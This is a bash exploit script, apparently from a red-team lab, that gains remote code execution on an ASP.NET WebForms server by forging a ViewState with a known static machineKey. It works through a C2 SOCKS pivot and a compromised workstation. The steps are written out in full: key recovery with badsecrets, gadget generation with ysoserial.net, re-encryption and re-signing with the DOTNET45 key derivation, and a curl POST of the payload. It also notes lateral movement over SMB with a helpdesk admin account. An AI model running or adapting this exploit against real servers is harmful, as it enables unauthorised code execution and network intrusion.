#!/bin/bash
# =============================================================================
# M5.1 — ASP.NET ViewState RCE on OSCAR-WEB  [VALIDATED LIVE via Mythic SOCKS]
#
# CorpShop (IIS/WebForms, http://OSCAR-WEB:8080) ships a STATIC <machineKey>
# in web.config (validation=SHA1, decryption=AES). With the key known, an
# operator forges a __VIEWSTATE carrying a deserialization gadget -> RCE as the
# app-pool identity.
#
# Reached entirely through C2: Kali -> Mythic Athena beacon on AREUBEN-WS
# (SOCKS on the Mythic server) -> OSCAR-WEB. proxychains cfg = /tmp/pc.conf:
#     socks5 10.3.10.20 7005     (Athena `socks` on the CHARLIE beacon)
#
# Key gotcha (why plain ysoserial.net fails here): httpRuntime targetFramework
# 4.5 => the ViewState uses the DOTNET45 crypto scheme. The MAC/enc keys are
# derived with SP800-108 whose *context* is the page PURPOSE STRINGS
# (["TemplateSourceDirectory: /","Type: DEFAULT_ASPX"]), NOT the __VIEWSTATEGENERATOR
# bytes. ysoserial's --generator uses the legacy modifier and its MAC is rejected
# ("Validation of viewstate MAC failed"). Fix: let ysoserial build the *gadget
# bytes*, then RE-ENCRYPT + RE-SIGN with badsecrets' own KDF (which matched the
# live server's MAC -> proven correct).
# =============================================================================
set -u
PC="proxychains4 -f /tmp/pc.conf"
WEB="http://10.3.40.20:8080"
GEN="CA0B0334"
VK="8B7A6C5D4E3F2A1B0C9D8E7F6A5B4C3D2E1F0A9B8C7D6E5F4A3B2C1D0E9F8A7B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F708192A3B4C5D6E7F8091A2B3C4D5E6F"
DK="34C69D15A2B8E7F00D1C2B3A49586776C5D4E3F2A1B0C9D8E7F6A5B4C3D2E1F0"

echo "== 1. recover the machineKey from the live ViewState (badsecrets) =="
# badsecrets fetches Default.aspx over the SOCKS pivot and confirms the key +
# Mode [DOTNET45] + Generator CA0B0334. (-t raises the 10s timeout for the slow pivot.)
echo "$VK,$DK" > /tmp/mykeys.txt
$PC badsecrets -t 45 -u "$WEB/Default.aspx" -c /tmp/mykeys.txt 2>/dev/null \
  | grep -iE "Known Secret Found|Mode|MachineKey" | head -3
# -> "Known Secret Found!  ... Mode [DOTNET45]"

echo "== 2. build the gadget bytes with ysoserial.net (run on the Windows beacon) =="
# On AREUBEN-WS (real .NET Framework), via Athena `shell`:
#   ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "<cmd>" \
#     --generator=CA0B0334 --validationalg=SHA1 --validationkey=$VK   > vsB.txt
# Fetch vsB.txt back over SMB (svc_helpdesk admin on AREUBEN-WS) to /tmp/vsB.txt.
# (Its 20-byte trailing HMAC is wrong for DOTNET45 -- we discard it in step 3.)

echo "== 3. re-encrypt + re-sign with the DOTNET45 KDF, then POST =="
#   /tmp/vg/bin/python encrypt.py        # strips ysoserial MAC, AES-CBC encrypts the
#                                        # gadget bytes + HMAC-SHA1s over IV||ct using
#                                        # sp800_108_derivekey(key, purpose) -> enc_0.txt
$PC curl -s -m 45 -o /tmp/rce.html -w "HTTP %{http_code}\n" \
  --data-urlencode "__VIEWSTATE@/tmp/enc_0.txt" \
  --data "__VIEWSTATEGENERATOR=$GEN" "$WEB/Default.aspx" 2>/dev/null

echo "== 4. confirm gadget executed =="
# PASS signature: the server MAC-validates + decrypts + DESERIALIZES the gadget,
# which fires Process.Start during SortedSet<String> reconstruction, then throws:
#   InvalidCastException: ... 'SortedSet`1[System.String]' to type 'System.Web.UI.Pair'
grep -oiE "SortedSet.1\[System.String\]|Unable to cast|Pair" /tmp/rce.html | head -2
echo "M5.1 PASS: forged ViewState deserialized (TypeConfuseDelegate) -> RCE as app pool on OSCAR-WEB."
